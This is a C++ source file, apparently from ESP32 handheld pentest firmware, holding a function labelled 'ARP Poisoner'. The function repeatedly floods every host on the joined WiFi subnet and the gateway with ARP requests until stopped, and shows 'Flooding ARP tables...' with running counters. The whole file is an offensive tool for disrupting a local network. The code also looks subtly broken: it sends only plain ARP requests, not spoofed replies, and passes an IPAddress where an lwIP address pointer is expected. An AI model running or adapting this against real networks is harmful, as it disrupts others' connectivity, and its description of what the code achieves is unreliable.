#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <lwip/etharp.h>
#include <lwip/netif.h>
#include <globals.h>

void arsenal_arp_poisoner(void) {
    ARSENAL_HEAP_CHECK();
    if (WiFi.getMode() != WIFI_STA || WiFi.status() != WL_CONNECTED) {
        displayRedStripe("WiFi not connected");
        delay(1500);
        return;
    }

    IPAddress gateway = WiFi.gatewayIP();
    IPAddress subnet = WiFi.subnetMask();
    IPAddress localIP = WiFi.localIP();

    uint32_t gw = (uint32_t)gateway;
    uint32_t mask = (uint32_t)subnet;
    uint32_t network = gw & mask;
    uint32_t bcast = network | ~mask;
    uint32_t total = bcast - network - 1;
    if (total > 254) total = 254;

    int targets = 0;
    unsigned long startTime = millis();

    drawMainBorderWithTitle("ARP Poisoner");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 45);
    tft.printf("Gateway: %s", gateway.toString().c_str());
    tft.setCursor(12, 60);
    tft.print("Flooding ARP tables...");
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
    delay(1000);

    while (true) {
        for (uint32_t i = 1; i <= total; i++) {
            if (check(EscPress)) goto done;

            uint32_t host = network + i;
            ip4_addr_t target;
            target.addr = htonl(host);

            etharp_request(netif_default, &target);
            targets++;
            delay(1);

            etharp_request(netif_default, &gateway);
            delay(1);
        }

        drawMainBorderWithTitle("ARP Poisoner");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Gateway: %s", gateway.toString().c_str());
        y += 14;
        tft.setCursor(12, y);
        tft.printf("ARP requests: %d", targets);
        y += 14;
        unsigned long elapsed = (millis() - startTime) / 1000;
        tft.setCursor(12, y);
        tft.printf("Time: %lus", elapsed);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Hosts: %d", (int)total);
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);

        esp_task_wdt_reset();
        delay(300);
    }

done:
    drawMainBorderWithTitle("ARP Poisoner");
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 55);
    tft.printf("Stopped. Sent %d requests", targets);
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString("Esc:done", tftWidth / 2, tftHeight - 20, 1);
    while (!check(EscPress)) delay(100);
}
